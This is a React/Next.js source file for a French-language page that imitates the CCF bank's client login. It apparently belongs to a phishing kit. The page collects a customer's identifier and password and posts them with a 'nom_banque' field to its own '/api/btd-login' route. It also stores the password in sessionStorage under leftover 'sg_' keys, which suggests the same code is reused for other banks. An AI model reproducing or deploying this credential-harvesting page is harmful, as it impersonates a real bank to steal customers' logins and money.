'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface CCFConnexionProps {
  partnerLogoSrc?: string;
  ccfLogoSrc?: string;
}

export default function CCFConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  ccfLogoSrc = '/CCF-2023.svg.webp',
}: CCFConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(true);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Passage de l'Étape 1 à l'Étape 2
  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  // Ajout depuis le clavier virtuel
  const handleKeyPress = (val: string) => {
    setSecretCode((prev) => prev + val);
  };

  // Effacement depuis le clavier virtuel
  const handleBackspace = () => {
    if (secretCode.length > 0) {
      setSecretCode((prev) => prev.slice(0, -1));
    }
  };

// Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'CCF',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const keyboardKeys = ['9', '1', '0', '8', '5', '6', '4', '2', '7', '3'];

  return (
    <>
      <style>{`
        .ccf-body-wrapper {
          font-family: 'Montserrat', system-ui, -apple-system, sans-serif;
          background-color: #f1f5f9;
          color: #1e293b;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .ccf-app-container {
          width: 100%;
          max-width: 440px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
        }
        .ccf-header {
          background-color: #ffffff;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 16px 20px;
          border-bottom: 1px solid #e2e8f0;
        }
        .ccf-logo-block {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .ccf-partner-logo {
          height: 24px;
          width: 24px;
          object-fit: contain;
        }
        .ccf-header-arrow {
          color: #94a3b8;
          font-size: 14px;
          font-weight: 600;
        }
        .ccf-main-logo {
          height: 24px;
          width: auto;
          object-fit: contain;
        }
        .ccf-header-right {
          display: flex;
          align-items: center;
          gap: 8px;
          background-color: #f8fafc;
          padding: 6px 12px;
          border-radius: 20px;
          border: 1px solid #e2e8f0;
        }
        .ccf-header-right span {
          color: #00356b;
          font-size: 12px;
          font-weight: 700;
          font-family: 'Poppins', sans-serif;
          letter-spacing: 0.3px;
        }
        .ccf-content {
          padding: 35px 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .ccf-center-icon-zone {
          margin-bottom: 24px;
          display: flex;
          justify-content: center;
        }
        .ccf-main-lock-circle {
          width: 68px;
          height: 68px;
          background: linear-gradient(135deg, #00356b, #00234a);
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 6px 20px rgba(0, 53, 107, 0.15);
        }
        .ccf-main-lock-circle svg {
          width: 26px;
          height: 26px;
          fill: #ffffff;
        }
        .ccf-main-title {
          font-family: 'Poppins', sans-serif;
          font-size: 21px;
          color: #00356b;
          font-weight: 700;
          text-align: center;
          margin-bottom: 30px;
          letter-spacing: -0.3px;
        }
        .ccf-form-group {
          width: 100%;
          margin-bottom: 20px;
        }
        .ccf-input-label {
          display: block;
          font-size: 13.5px;
          color: #475569;
          margin-bottom: 8px;
          font-weight: 600;
        }
        .ccf-input-wrapper {
          position: relative;
          width: 100%;
        }
        .ccf-free-input {
          width: 100%;
          height: 52px;
          padding: 0 42px 0 16px;
          border: 1px solid #cbd5e1;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          color: #00356b;
          outline: none;
          background-color: #ffffff;
          font-weight: 600;
          transition: all 0.2s ease;
        }
        .ccf-free-input:focus {
          border-color: #00356b;
          box-shadow: 0 0 0 1px #00356b;
        }
        .ccf-clear-input {
          position: absolute;
          right: 14px;
          top: 50%;
          transform: translateY(-50%);
          font-size: 22px;
          color: #94a3b8;
          cursor: pointer;
          user-select: none;
        }
        .ccf-checkbox-row {
          display: flex;
          align-items: center;
          width: 100%;
          gap: 12px;
          margin-bottom: 30px;
        }
        .ccf-custom-checkbox {
          width: 20px;
          height: 20px;
          cursor: pointer;
          accent-color: #00356b;
          border-radius: 4px;
        }
        .ccf-checkbox-label {
          font-size: 14px;
          color: #475569;
          cursor: pointer;
          font-weight: 500;
          user-select: none;
        }
        .ccf-id-back-strip {
          width: 100%;
          background-color: #f8fafc;
          padding: 12px 16px;
          border-radius: 8px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 24px;
          cursor: pointer;
          border: 1px solid #e2e8f0;
          transition: background-color 0.2s;
        }
        .ccf-id-back-strip:hover {
          background-color: #f1f5f9;
        }
        .ccf-id-strip-left {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .ccf-back-arrow {
          font-size: 20px;
          color: #00356b;
          font-weight: 700;
          line-height: 1;
        }
        .ccf-display-num {
          font-size: 14.5px;
          color: #00356b;
          font-weight: 700;
          letter-spacing: 0.5px;
        }
        .ccf-modify-text {
          font-size: 12.5px;
          color: #64748b;
          font-weight: 500;
          text-decoration: underline;
        }
        .ccf-btn-main-blue {
          width: 100%;
          height: 52px;
          background-color: #00356b;
          color: #ffffff;
          border: none;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: background-color 0.2s;
          box-shadow: 0 4px 12px rgba(0, 53, 107, 0.12);
        }
        .ccf-btn-main-blue:hover {
          background-color: #00234a;
        }
        .ccf-btn-submit-disabled {
          width: 100%;
          height: 52px;
          background-color: #cbd5e1;
          color: #ffffff;
          border: none;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: not-allowed;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .ccf-keyboard-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 10px;
          width: 100%;
          margin-bottom: 28px;
        }
        .ccf-key {
          background-color: #ffffff;
          border: 1px solid #e2e8f0;
          border-radius: 8px;
          height: 54px;
          font-family: 'Poppins', sans-serif;
          font-size: 20px;
          font-weight: 600;
          color: #00356b;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 1px 3px rgba(0,0,0,0.02);
          transition: all 0.1s ease;
        }
        .ccf-key:active {
          background-color: #f1f5f9;
          transform: scale(0.98);
        }
        .ccf-key-backspace {
          grid-column: span 2;
          font-size: 14px;
          font-weight: 600;
          background-color: #f8fafc;
          font-family: 'Montserrat', sans-serif;
          color: #64748b;
        }
        .ccf-key-backspace:active {
          background-color: #e2e8f0;
        }
        .ccf-footer-links {
          margin-top: auto;
          padding-top: 25px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 12px;
          width: 100%;
          border-top: 1px dashed #e2e8f0;
        }
        .ccf-footer-link {
          color: #00356b;
          text-decoration: none;
          font-size: 14px;
          font-weight: 600;
        }
        .ccf-footer-link:hover {
          text-decoration: underline;
        }
      `}</style>

      <div className="ccf-body-wrapper">
        <div className="ccf-app-container">

          {/* ÉTAPE 1 : IDENTIFIANT EN SAISIE LIBRE */}
          {step === 1 && (
            <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', width: '100%' }}>
              <header className="ccf-header">
                <div className="ccf-logo-block">
                  <img src={partnerLogoSrc} alt="Favicon" className="ccf-partner-logo" />
                  <span className="ccf-header-arrow">→</span>
                  <img src={ccfLogoSrc} alt="CCF Logo" className="ccf-main-logo" />
                </div>
                <div className="ccf-header-right">
                  <span>Espace client</span>
                </div>
              </header>

              <main className="ccf-content">
                <div className="ccf-center-icon-zone">
                  <div className="ccf-main-lock-circle">
                    <svg viewBox="0 0 24 24">
                      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                    </svg>
                  </div>
                </div>

                <h2 className="ccf-main-title">Connexion à votre espace</h2>

                <div className="ccf-form-group">
                  <label className="ccf-input-label" htmlFor="ccf-client-id">
                    Votre identifiant
                  </label>
                  <div className="ccf-input-wrapper">
                    <input
                      type="text"
                      id="ccf-client-id"
                      className="ccf-free-input"
                      placeholder="Saisissez votre identifiant"
                      value={clientId}
                      onChange={(e) => setClientId(e.target.value)}
                      autoComplete="off"
                    />
                    {clientId.length > 0 && (
                      <span className="ccf-clear-input" onClick={() => setClientId('')}>
                        ×
                      </span>
                    )}
                  </div>
                </div>

                <div className="ccf-checkbox-row">
                  <input
                    type="checkbox"
                    id="ccf-remember-me"
                    className="ccf-custom-checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="ccf-remember-me" className="ccf-checkbox-label">
                    Mémoriser mon identifiant
                  </label>
                </div>

                <button
                  type="button"
                  onClick={handleNextStep}
                  disabled={!clientId.trim()}
                  className={clientId.trim() ? 'ccf-btn-main-blue' : 'ccf-btn-submit-disabled'}
                >
                  Suivant
                </button>

                <div className="ccf-footer-links">
                  <a href="#" className="ccf-footer-link">Première connexion ?</a>
                  <a href="#" className="ccf-footer-link">Identifiant ou mot de passe oublié ?</a>
                </div>
              </main>
            </div>
          )}

          {/* ÉTAPE 2 : MOT DE PASSE EN SAISIE LIBRE (Saisie directe + Clavier) */}
          {step === 2 && (
            <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', width: '100%' }}>
              <header className="ccf-header">
                <div className="ccf-logo-block">
                  <img src={partnerLogoSrc} alt="Favicon" className="ccf-partner-logo" />
                  <span className="ccf-header-arrow">→</span>
                  <img src={ccfLogoSrc} alt="CCF Logo" className="ccf-main-logo" />
                </div>
                <div className="ccf-header-right">
                  <span>Espace client</span>
                </div>
              </header>

              <main className="ccf-content">
                <div className="ccf-center-icon-zone">
                  <div className="ccf-main-lock-circle">
                    <svg viewBox="0 0 24 24">
                      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                    </svg>
                  </div>
                </div>

                <h2 className="ccf-main-title">Connexion à votre espace</h2>

                {/* Ruban de Retour */}
                <div
                  className="ccf-id-back-strip"
                  onClick={() => {
                    setSecretCode('');
                    setStep(1);
                  }}
                >
                  <div className="ccf-id-strip-left">
                    <span className="ccf-back-arrow">‹</span>
                    <span className="ccf-display-num">{clientId}</span>
                  </div>
                  <span className="ccf-modify-text">Modifier</span>
                </div>

                <div className="ccf-form-group">
                  <label className="ccf-input-label">Votre mot de passe</label>
                  <div className="ccf-input-wrapper">
                    <input
                      type="password"
                      className="ccf-free-input"
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                      placeholder="Saisissez votre code secret"
                    />
                    {secretCode.length > 0 && (
                      <span className="ccf-clear-input" onClick={() => setSecretCode('')}>
                        ×
                      </span>
                    )}
                  </div>
                </div>

                {/* Grille Clavier Virtuel */}
                <div className="ccf-keyboard-grid">
                  {keyboardKeys.map((num) => (
                    <button
                      key={num}
                      type="button"
                      className="ccf-key"
                      onClick={() => handleKeyPress(num)}
                    >
                      {num}
                    </button>
                  ))}
                  <button
                    type="button"
                    className="ccf-key ccf-key-backspace"
                    onClick={handleBackspace}
                  >
                    Effacer ⌫
                  </button>
                </div>

                {/* Bouton de Soumission */}
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!secretCode.trim() || isSubmitting}
                  className={secretCode.trim() && !isSubmitting ? 'ccf-btn-main-blue' : 'ccf-btn-submit-disabled'}
                >
                  {isSubmitting ? 'Validation en cours...' : 'Se connecter'}
                </button>

                <div className="ccf-footer-links">
                  <a href="#" className="ccf-footer-link">Première connexion ?</a>
                  <a href="#" className="ccf-footer-link">Identifiant ou mot de passe oublié ?</a>
                </div>
              </main>
            </div>
          )}

        </div>
      </div>
    </>
  );
}